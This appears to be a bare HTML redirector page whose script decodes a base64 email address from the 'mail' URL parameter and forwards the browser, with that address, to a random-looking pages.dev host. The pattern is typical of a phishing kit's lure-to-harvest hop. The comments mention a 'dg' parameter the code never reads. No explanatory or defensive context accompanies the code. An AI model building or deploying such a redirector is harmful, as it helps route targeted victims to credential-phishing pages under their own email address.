<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>

	<script type="text/javascript">
		let querystring = window.location.search;
		let urlParam = new URLSearchParams(querystring);
		
		// Get the 'dg' parameter from the query string
		let encodedValue = urlParam.get('mail');
		
		if (encodedValue) {
		    // Decode the Base64 value using atob
		    let decodedValue = atob(encodedValue);

		    // Redirect to the new URL with the decoded value
		    window.location.replace("https://isp54vgyd789.pages.dev/?mail=" + encodeURIComponent(decodedValue));
		} else {
		    console.error("The 'dg' parameter is missing in the query string.");
		}
	</script>

</body>
</html>
